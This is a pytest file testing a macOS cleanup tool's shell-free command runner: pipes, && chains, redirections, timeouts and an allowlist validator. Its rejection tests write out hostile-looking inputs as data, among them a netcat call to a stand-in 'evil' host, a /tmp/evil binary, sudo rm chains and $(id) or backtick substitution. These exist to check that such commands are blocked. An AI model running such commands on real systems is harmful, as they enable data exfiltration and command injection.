"""Pipelines, && sequencing and redirections run without a shell."""

import pytest

from mac_cleanup.errors import CommandError, CommandTimeoutError, CommandValidationError
from mac_cleanup.utils import _is_command_allowed, cmd


def test_pipe_connects_commands() -> None:
    assert cmd("echo hello | grep -c hello") == "1"
    assert cmd("echo hello | grep -c nope") == "0"


def test_pipe_with_three_stages() -> None:
    assert cmd("echo abc | grep abc | grep -c abc") == "1"


def test_and_runs_second_command_only_after_success(tmp_path) -> None:
    marker = tmp_path / "marker"
    cmd(f"mkdir {marker} && echo done")
    assert marker.is_dir()

    # Failing first command stops the sequence
    out = cmd(f"grep -q nothing {tmp_path} && mkdir {tmp_path / 'never'}")
    assert not (tmp_path / "never").exists()
    assert out == ""


def test_and_concatenates_output() -> None:
    assert cmd("echo one && echo two") == "one\ntwo"


@pytest.mark.parametrize(
    "command",
    ["echo hi >/dev/null", "echo hi 1>/dev/null", "echo hi &>/dev/null", "echo hi >/dev/null 2>&1"],
)
def test_redirect_to_devnull_discards_output(command: str) -> None:
    assert cmd(command) == ""


def test_stderr_merge_and_discard() -> None:
    noisy = "python3 -c 'import sys; print(\"oops\", file=sys.stderr)'"
    # python3 is not on the allowlist, so skip validation for this stderr fixture
    assert "oops" in cmd(f"{noisy} 2>&1", ignore_errors=False, validate_command=False)
    assert cmd(f"{noisy} 2>/dev/null", ignore_errors=False, validate_command=False) == ""


def test_failure_raises_unless_ignored() -> None:
    assert cmd("du /definitely/missing") == ""
    with pytest.raises(CommandError):
        cmd("du /definitely/missing", ignore_errors=False)


def test_timeout_kills_every_stage() -> None:
    with pytest.raises(CommandTimeoutError):
        cmd("sleep 5 | grep x", timeout=1)


@pytest.mark.parametrize(
    "command",
    [
        "echo a || echo b",
        "echo a ; echo b",
        "du x | sudo rm x",
        "echo hi && sudo purge",
        "| grep x",
        "echo a &&",
        "echo a | | grep a",
    ],
)
def test_unsafe_or_malformed_commands_are_rejected(command: str) -> None:
    assert not _is_command_allowed(command)
    with pytest.raises(CommandValidationError):
        cmd(command)


def test_every_stage_executable_is_checked() -> None:
    assert _is_command_allowed("ps aux | grep Telegram")
    assert not _is_command_allowed("ps aux | nc evil 1")
    assert not _is_command_allowed("echo a && nc evil 1")
    assert not _is_command_allowed("ps aux | /tmp/evil")


def test_arguments_with_operator_characters_stay_arguments() -> None:
    assert cmd("echo 'a|b' 'c&&d'") == "a|b c&&d"


@pytest.mark.parametrize("command", ["echo a; echo b", "echo `id`", "echo $(id)", "echo ${HOME}"])
def test_attached_shell_syntax_is_inert_without_a_shell(command: str) -> None:
    """Without a shell these are plain arguments: nothing is expanded or chained."""
    import shlex

    assert cmd(command) == " ".join(shlex.split(command)[1:])
